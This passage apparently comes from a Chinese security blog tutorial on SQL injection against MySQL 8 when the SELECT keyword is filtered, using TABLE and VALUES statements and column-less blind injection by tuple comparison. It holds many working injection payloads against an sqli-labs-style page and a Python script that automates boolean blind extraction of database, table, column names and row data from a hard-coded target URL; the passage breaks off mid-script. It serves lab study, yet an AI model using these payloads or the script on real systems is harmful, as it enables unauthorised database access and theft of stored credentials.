class="line">+<span class="comment">----------+----------+--------------+</span></span><br></pre></td></tr></table></figure><p>场景：select关键词被过滤，多语句无法使用  </p><p>1.判断列数<br>由于TABLE命令和VALUES返回的都是表数据，它们所返回的数据可以通过UNION语句联合起来，当列数不对时会报错，根据这点可以判断列数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TABLE users union VALUES ROW(1,2,3);</span><br></pre></td></tr></table></figure><p>2.使用values判断回显位</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id&#x3D;-1 union values row(1,2,3);</span><br></pre></td></tr></table></figure><p>3.列出所有数据库名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">table information_schema.schemata;</span><br></pre></td></tr></table></figure><p>4.盲注查询任意表中的内容</p><p>语句table users limit 1;的查询结果：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt;  table users limit 1;</span><br><span class="line">+<span class="comment">------+----------+----------+</span></span><br><span class="line">| id   | username | password |</span><br><span class="line">+<span class="comment">------+----------+----------+</span></span><br><span class="line">|    1 | Dumb     | Dumb     |</span><br><span class="line">+<span class="comment">------+----------+----------+</span></span><br></pre></td></tr></table></figure><p>实质上是(id, username, password)与(1, ‘Dumb’, ‘Dumb’)进行比较，比较顺序为自左向右，第一列(也就是第一个元组元素)判断正确再判断第二列(也就是第二个元组元素)。<br>两个元组第一个字符比大小，如果第一个字符相等就比第二个字符的大小，以此类推，最终结果即为元组的大小。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select ((1,'','')&lt;(table users limit 1));</span><br><span class="line">+<span class="comment">-----------------------------------+</span></span><br><span class="line">| ((1,'','')&lt;(table users limit 1)) |</span><br><span class="line">+<span class="comment">-----------------------------------+</span></span><br><span class="line">|                                 1 |</span><br><span class="line">+<span class="comment">-----------------------------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">select</span> ((<span class="number">2</span>,<span class="string">''</span>,<span class="string">''</span>)&lt;(<span class="keyword">table</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">1</span>));</span><br><span class="line">+<span class="comment">-----------------------------------+</span></span><br><span class="line">| ((2,'','')&lt;(table users limit 1)) |</span><br><span class="line">+<span class="comment">-----------------------------------+</span></span><br><span class="line">|                                 0 |</span><br><span class="line">+<span class="comment">-----------------------------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line">mysql&gt; <span class="keyword">select</span> ((<span class="number">1</span>,<span class="string">'Du'</span>,<span class="string">''</span>)&lt;(<span class="keyword">table</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">1</span>));</span><br><span class="line">+<span class="comment">-------------------------------------+</span></span><br><span class="line">| ((1,'Du','')&lt;(table users limit 1)) |</span><br><span class="line">+<span class="comment">-------------------------------------+</span></span><br><span class="line">|                                   1 |</span><br><span class="line">+<span class="comment">-------------------------------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">select</span> ((<span class="number">1</span>,<span class="string">'Dum'</span>,<span class="string">''</span>)&lt;(<span class="keyword">table</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">1</span>));</span><br><span class="line">+<span class="comment">--------------------------------------+</span></span><br><span class="line">| ((1,'Dum','')&lt;(table users limit 1)) |</span><br><span class="line">+<span class="comment">--------------------------------------+</span></span><br><span class="line">|                                    1 |</span><br><span class="line">+<span class="comment">--------------------------------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">select</span> ((<span class="number">1</span>,<span class="string">'Dumb'</span>,<span class="string">''</span>)&lt;(<span class="keyword">table</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">1</span>));</span><br><span class="line">+<span class="comment">---------------------------------------+</span></span><br><span class="line">| ((1,'Dumb','')&lt;(table users limit 1)) |</span><br><span class="line">+<span class="comment">---------------------------------------+</span></span><br><span class="line">|                                     1 |</span><br><span class="line">+<span class="comment">---------------------------------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">select</span> ((<span class="number">1</span>,<span class="string">'Dumb'</span>,<span class="string">'D'</span>)&lt;(<span class="keyword">table</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">1</span>));</span><br><span class="line">+<span class="comment">----------------------------------------+</span></span><br><span class="line">| ((1,'Dumb','D')&lt;(table users limit 1)) |</span><br><span class="line">+<span class="comment">----------------------------------------+</span></span><br><span class="line">|                                      1 |</span><br><span class="line">+<span class="comment">----------------------------------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>需要注意的地方<br>1.当前判断的所在列的后一列需要用字符表示，不能用数字，否则判断到当前列的最后一个字符会判断不出！<br><img src="../../images/loopholes/sql/6.png" alt=""><br>2.最好用&lt;=替换&lt;，用&lt;比较一开始并没有问题，但到最后一位时结果为正确字符的前一个字符，用&lt;=结果更直观。<br><img src="../../images/loopholes/sql/7.png" alt=""><br>最终判断过程如下：  </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select ((1,'Dumb','Dumb')&lt;=(table users limit 1));</span><br><span class="line">+<span class="comment">--------------------------------------------+</span></span><br><span class="line">| ((1,'Dumb','Dumb')&lt;=(table users limit 1)) |</span><br><span class="line">+<span class="comment">--------------------------------------------+</span></span><br><span class="line">|                                          1 |</span><br><span class="line">+<span class="comment">--------------------------------------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">select</span> ((<span class="number">1</span>,<span class="string">'Dumb'</span>,<span class="string">'Dumc'</span>)&lt;=(<span class="keyword">table</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">1</span>));</span><br><span class="line">+<span class="comment">--------------------------------------------+</span></span><br><span class="line">| ((1,'Dumb','Dumc')&lt;=(table users limit 1)) |</span><br><span class="line">+<span class="comment">--------------------------------------------+</span></span><br><span class="line">|                                          0 |</span><br><span class="line">+<span class="comment">--------------------------------------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>例题：   </p><p>1.判断列数<br>使用经典的order by语句判断：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1' order by 3<span class="comment">--+   #正常</span></span><br><span class="line">1' order by 4<span class="comment">--+   #显示Unknown column '4' in 'order clause'</span></span><br></pre></td></tr></table></figure><p>说明有3列</p><p>2.使用values判断回显位</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1' union <span class="keyword">values</span> <span class="keyword">row</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>3.爆库爆表爆字段爆数据<br>（1）爆当前数据库</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-1' union <span class="keyword">values</span> <span class="keyword">row</span>(<span class="number">1</span>,<span class="keyword">database</span>(),<span class="number">3</span>)<span class="comment">--+</span></span><br><span class="line"><span class="comment">#或利用盲注1' and ascii(substr((database()),1,1))=115--+   即s</span></span><br></pre></td></tr></table></figure><p>（2）爆所有数据库<br>因为table不能像select控制列数，除非列数一样的表，不然都回显不出来。<br>需要使用table查询配合无列名盲注<br>information_schema.schemata表有6列<br>因为schemata表中的第一列是def，不需要判断，所以可以直接判断库名</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1' and ('def','m','',4,5,6)&lt;=(table information_schema.schemata limit 1)--+ #回显正常</span><br><span class="line">1' and ('def','n','',4,5,6)&lt;=(table information_schema.schemata limit 1)--+ #回显错误</span><br><span class="line"><span class="comment">#得到第1个数据库名的第一个字符为m</span></span><br><span class="line">......</span><br><span class="line">1' and ('def','mysql','',4,5,6)&lt;=(table information_schema.schemata limit 1)--+ #回显正常</span><br><span class="line">1' and ('def','mysqm','',4,5,6)&lt;=(table information_schema.schemata limit 1)--+ #回显错误</span><br></pre></td></tr></table></figure><p>说明第1个数据库名为mysql</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1' and ('def','information_schema','',4,5,6)&lt;=(table information_schema.schemata limit 1,1)--+ #回显正常</span><br><span class="line">1' and ('def','information_schemb','',4,5,6)&lt;=(table information_schema.schemata limit 1,1)--+ #回显错误</span><br><span class="line"><span class="comment">#说明第2个数据库名为information_schema</span></span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>一直猜解，直到获得全部数据库名<br>（3）爆数据表<br>information_schema.tables表有21列</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1' and ('def','security','users','',5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)&lt;=(table information_schema.tables limit 317,1)--+ #第一个表users</span><br><span class="line"></span><br><span class="line">1' and ('def','security','emails','',5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)&lt;=(table information_schema.tables limit 318,1)--+ #第二个表emails</span><br><span class="line"></span><br><span class="line">1' and ('def','security','uagents','',5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)&lt;=(table information_schema.tables limit 319,1)--+ #第三个表uagents</span><br><span class="line"></span><br><span class="line">1' and ('def','security','referers','',5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)&lt;=(table information_schema.tables limit 320,1)--+ #第四个表referers</span><br></pre></td></tr></table></figure><p>前两个字段都是确定的，可以写一个for循环判断，如果结果为真，代表从那行开始(这里是limit 317,1，即第318行)，然后盲注第三个列。<br>（4）爆字段名<br>information_schema.columns表有22列<br>得到所有表名后开始判断字段名，找到columns表，具体方法和上面一样</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1' and ('def','security','users','id','',6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22)&lt;=(table information_schema.columns limit 3386,1)--+ #users表第一个字段为id</span><br><span class="line"></span><br><span class="line">1' and ('def','security','users','password','',6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22)&lt;=(table information_schema.columns limit 3387,1)--+ #users表，第二个字段为password</span><br><span class="line"></span><br><span class="line">1' and ('def','security','users','username','',6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22)&lt;=(table information_schema.columns limit 3388,1)--+ #users表，第三个字段为username</span><br></pre></td></tr></table></figure><p>（3）爆数据</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1' and (1,'D','')&lt;=(table users limit 1)--+ #正常</span><br><span class="line">1' and (1,'E','')&lt;=(table users limit 1)--+ #错误</span><br><span class="line"></span><br><span class="line"><span class="comment">#table users limit 1也就是table users limit 0,1</span></span><br><span class="line"><span class="comment">#1' and (1,'D','')&lt;=(table users limit 0,1)--+ #正常</span></span><br><span class="line"><span class="comment">#1' and (1,'E','')&lt;=(table users limit 0,1)--+ #错误</span></span><br><span class="line">......</span><br><span class="line">1' and (1,'Dumb','Dumb')&lt;=(table users limit 1)--+ #正常</span><br><span class="line">1' and (1,'Dumb','Dumc')&lt;=(table users limit 1)--+ #错误</span><br></pre></td></tr></table></figure><p>得到第1个记录为1 Dumb Dumb</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1' and (8,'admin','admin')&lt;=(table users limit 7,1)--+ #正常</span><br><span class="line">1' and (8,'admin','admio')&lt;=(table users limit 7,1)--+ #错误</span><br></pre></td></tr></table></figure><p>得到第8个记录为8 admin admin<br>一步一步注出数据</p><p>脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;&#39;</span><br><span class="line">@desc 本脚本是用于mysql 8新特性的sql注入</span><br><span class="line"></span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;121.41.231.75:8002&#x2F;Less-8&#x2F;?id&#x3D;&#39;</span><br><span class="line">chars&#x3D;string.ascii_letters+string.digits+&quot;@&#123;&#125;_-?&quot;</span><br><span class="line"></span><br><span class="line">def current_db(url):</span><br><span class="line">    print(&quot;利用mysql8新特性或普通布尔盲注:\n1.新特性(联合查询) 2.普通布尔盲注&quot;)</span><br><span class="line">    print(&quot;请输入序号:&quot;,end&#x3D;&#39;&#39;)</span><br><span class="line">    num &#x3D; int(input())</span><br><span class="line">    if num &#x3D;&#x3D; 1:</span><br><span class="line">        payload &#x3D; &quot;-1&#39; union values row(1,database(),3)--+&quot;  #联合查询爆当前数据库(可修改)</span><br><span class="line">        urls &#x3D; url + payload</span><br><span class="line">        r &#x3D; requests.get(url&#x3D;urls)</span><br><span class="line">        print(r.text)</span><br><span class="line">    else:</span><br><span class="line">        name&#x3D;&#39;&#39;</span><br><span class="line">        payload &#x3D; &quot;1&#39; and ascii(substr((database()),&#123;0&#125;,1))&#x3D;&#123;1&#125;--+&quot; #布尔盲注爆当前数据库(可修改)</span><br><span class="line">        for i in range(1,40):</span><br><span class="line">            char&#x3D;&#39;&#39;</span><br><span class="line">            for j in chars:</span><br><span class="line">                payloads &#x3D; payload.format(i,ord(j))</span><br><span class="line">                urls &#x3D; url + payloads</span><br><span class="line">                r &#x3D; requests.get(url&#x3D;urls)</span><br><span class="line">                if &quot;You are in&quot; in r.text:</span><br><span class="line">                    name +&#x3D; j</span><br><span class="line">                    print(name)</span><br><span class="line">                    char &#x3D; j</span><br><span class="line">                    break</span><br><span class="line">            if char &#x3D;&#x3D; &#39;&#39;:</span><br><span class="line">                break</span><br><span class="line"></span><br><span class="line">def str2hex(name):</span><br><span class="line">    res &#x3D; &#39;&#39;</span><br><span class="line">    for i in name:</span><br><span class="line">        res +&#x3D; hex(ord(i))</span><br><span class="line">    res &#x3D; &#39;0x&#39; + res.replace(&#39;0x&#39;,&#39;&#39;)</span><br><span class="line">    return res</span><br><span class="line"></span><br><span class="line">def dbs(url): #无列名盲注爆所有数据库(可修改)</span><br><span class="line">    while True:</span><br><span class="line">        print(&quot;请输入要爆第几个数据库，如：1,2等:&quot;,end&#x3D;&#39;&#39;)</span><br><span class="line">        x &#x3D; int(input())-1</span><br><span class="line">        num &#x3D; str(x)</span><br><span class="line">        if x &lt; 0:</span><br><span class="line">            break</span><br><span class="line">        payload &#x3D; &quot;1&#39; and (&#39;def&#39;,&#123;&#125;,&#39;&#39;,4,5,6)&gt;(table information_schema.schemata limit &quot;+num+&quot;,1)--+&quot;</span><br><span class="line">        name &#x3D; &#39;&#39;</span><br><span class="line">        for i in range(1,20):</span><br><span class="line">            hexchar &#x3D; &#39;&#39;</span><br><span class="line">            for char in range(32, 126):</span><br><span class="line">                hexchar &#x3D; str2hex(name + chr(char))</span><br><span class="line">                payloads &#x3D; payload.format(hexchar)</span><br><span class="line">                #print(payloads)</span><br><span class="line">                urls &#x3D; url + payloads</span><br><span class="line">                r &#x3D; requests.get(url&#x3D;urls)</span><br><span class="line">                if &#39;You are in&#39; in r.text:</span><br><span class="line">                    name +&#x3D; chr(char-1)</span><br><span class="line">                    print(name)</span><br><span class="line">                    break</span><br><span class="line"></span><br><span class="line">def tables_n(url,database): #无列名盲注爆数据表开始行数(可修改)</span><br><span class="line">    payload &#x3D; &quot;1&#39; and (&#39;def&#39;,&#39;&quot;+database+&quot;&#39;,&#39;&#39;,&#39;&#39;,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)&lt;(table information_schema.tables limit &#123;&#125;,1)--+&quot;</span><br><span class="line">    for i in range(0,10000):</span><br><span class="line">        payloads &#x3D; payload.format(i)</span><br><span class="line">        urls &#x3D; url + payloads</span><br><span class="line">        r &#x3D; requests.get(url&#x3D;urls)</span><br><span class="line">        if &#39;You are in&#39; in r.text:</span><br><span class="line">            char &#x3D; chr(ord(database[-1])+1)</span><br><span class="line">            database &#x3D; database[0:-1]+char</span><br><span class="line">            payld &#x3D; &quot;1&#39; and (&#39;def&#39;,&#39;&quot;+database+&quot;&#39;,&#39;&#39;,&#39;&#39;,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)&lt;(table information_schema.tables limit &quot;+str(i)+&quot;,1)--+&quot;</span><br><span class="line">            urls &#x3D; url + payld</span><br><span class="line">            res &#x3D; requests.get(url&#x3D;urls)</span><br><span class="line">            #print(i)</span><br><span class="line">            if &#39;You are in&#39; not in res.text:</span><br><span class="line">                print(&#39;从第&#39;,i,&#39;行开始爆数据表&#39;)   #判断开始行数</span><br><span class="line">                n &#x3D; i</span><br><span class="line">                break</span><br><span class="line">    return n</span><br><span class="line"></span><br><span class="line">def tables(url,database,n):  #无列名盲注爆数据表(可修改)</span><br><span class="line">    while True:</span><br><span class="line">        print(&quot;请输入要爆第几个数据表，如：1,2等:&quot;,end&#x3D;&#39;&#39;)</span><br><span class="line">        x &#x3D; int(input())-1</span><br><span class="line">        num &#x3D; str(x + n)</span><br><span class="line">        if x &lt; 0:</span><br><span class="line">            break</span><br><span class="line">        payload &#x3D; &quot;1&#39; and (&#39;def&#39;,&#39;&quot;+database+&quot;&#39;,&#123;&#125;,&#39;&#39;,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)&gt;(table information_schema.tables limit &quot;+num+&quot;,1)--+&quot;</span><br><span class="line">        name &#x3D; &#39;&#39;</span><br><span class="line">        for i in range(1,20):</span><br><span class="line">            hexchar &#x3D; &#39;&#39;</span><br><span class="line">            for char in range(32, 126):</span><br><span class="line">                hexchar &#x3D; str2hex(name + chr(char))</span><br><span class="line">                payloads &#x3D; payload.format(hexchar)</span><br><span class="line">                #print(payloads)</span><br><span class="line">                urls &#x3D; url + payloads</span><br><span class="line">                r &#x3D; requests.get(url&#x3D;urls)</span><br><span class="line">                if &#39;You are in&#39; in r.text:</span><br><span class="line">                    name +&#x3D; chr(char-1)</span><br><span class="line">                    print(name)</span><br><span class="line">                    break</span><br><span class="line"></span><br><span class="line">def columns_n(url,database,table): #无列名盲注爆字段开始行数(可修改)</span><br><span class="line">    payload &#x3D; &quot;1&#39; and (&#39;def&#39;,&#39;&quot;+database+&quot;&#39;,&#39;&quot;+table+&quot;&#39;,&#39;&#39;,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22)&lt;(table information_schema.columns limit &#123;&#125;,1)--+&quot;</span><br><span class="line">    for i in range(3000,10000):</span><br><span class="line">        payloads &#x3D; payload.format(i)</span><br><span class="line">        urls &#x3D; url + payloads</span><br><span class="line">        r &#x3D; requests.get(url&#x3D;urls)</span><br><span class="line">        if &#39;You are in&#39; in r.text:</span><br><span class="line">            char &#x3D; chr(ord(table[-1])+1)</span><br><span class="line">            table &#x3D; table[0:-1]+char</span><br><span class="line">            payld &#x3D; &quot;1&#39; and (&#39;def&#39;,&#39;&quot;+database+&quot;&#39;,&#39;&quot;+table+&quot;&#39;,&#39;&#39;,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22)&lt;(table information_schema.columns limit &quot;+str(i)+&quot;,1)--+&quot;</span><br><span class="line">            urls &#x3D; url + payld</span><br><span class="line">            res &#x3D; requests.get(url&#x3D;urls)</span><br><span class="line">            #print(i)</span><br><span class="line">            if &#39;You are in&#39; not in res.text:</span><br><span class="line">                print(&#39;从第&#39;,i,&#39;行开始爆字段&#39;)   #判断开始行数</span><br><span class="line">                n &#x3D; i</span><br><span class="line">                break</span><br><span class="line">    return n</span><br><span class="line"></span><br><span class="line">def columns(url,database,table,n):  #无列名盲注爆字段值(可修改)</span><br><span class="line">    while True:</span><br><span class="line">        print(&quot;请输入要爆第几个字段，如：1,2等:&quot;,end&#x3D;&#39;&#39;)</span><br><span class="line">        x &#x3D; int(input())-1</span><br><span class="line">        num &#x3D; str(x + n)</span><br><span class="line">        if x &lt; 0:</span><br><span class="line">            break</span><br><span class="line">        payload &#x3D; &quot;1&#39; and (&#39;def&#39;,&#39;&quot;+database+&quot;&#39;,&#39;&quot;+table+&quot;&#39;,&#123;&#125;,&#39;&#39;,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22)&gt;(table information_schema.columns limit &quot;+num+&quot;,1)--+&quot;</span><br><span class="line">        name &#x3D; &#39;&#39;</span><br><span class="line">        for i in range(1,20):</span><br><span class="line">            hexchar &#x3D; &#39;&#39;</span><br><span class="line">            for char in range(32, 126):</span><br><span class="line">                hexchar &#x3D; str2hex(name + chr(char))</span><br><span class="line">                payloads &#x3D; payload.format(hexchar)</span><br><span class="line">                #print(payloads)</span><br><span class="line">                urls &#x3D; url + payloads</span><br><span class="line">                r &#x3D; requests.get(url&#x3D;urls)</span><br><span class="line">                if &#39;You are in&#39; in r.text:</span><br><span class="line">                    name +&#x3D; chr(char-1)</span><br><span class="line">                    print(name)</span><br><span class="line">                    break</span><br><span class="line"></span><br><span class="line">def datas(url,table):  #无列名盲注爆数据(可修改)</span><br><span class="line">    while True:</span><br><span class="line">        print(&quot;请输入要爆第几个数据，如：1,2等:&quot;,end&#x3D;&#39;&#39;)</span><br><span class="line">        x &#x3D; int(input())</span><br><span class="line">        y &#x3D; x-1</span><br><span class="line">        num &#x3D; str(y)</span><br><span class="line">        if y &lt; 0:</span><br><span class="line">            break</span><br><span class="line">        payload &#x3D; &quot;1&#39; and (&quot;+str(x)+&quot;,&#123;&#125;,&#39;&#39;)&gt;(table &quot;+table+&quot; limit &quot;+num+&quot;,1)--+&quot;</span><br><span class="line">        name &#x3D; &#39;&#39;</span><br><span class="line">        for i in range(1,20):</span><br><span class="line">            hexchar &#x3D; &#39;&#39;</span><br><span class="line">            for char in range(32, 126):</span><br><span class="line">                hexchar &#x3D; str2hex(name + chr(char))</span><br><span class="line">                payloads &#x3D; payload.format(hexchar)</span><br><span class="line">                #print(payloads)</span><br><span class="line">                urls &#x3D; url + payloads</span><br><span class="line">                r &#x3D; requests.get(url&#x3D;urls)</span><br><span class="line">                if &#39;You are in&#39; in r.text:</span><br><span class="line">                    name +&#x3D; chr(char-1)</span><br><span class="line">                    print(name)</span><br><span class="line">                    break</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    while True:</span><br><span class="line">        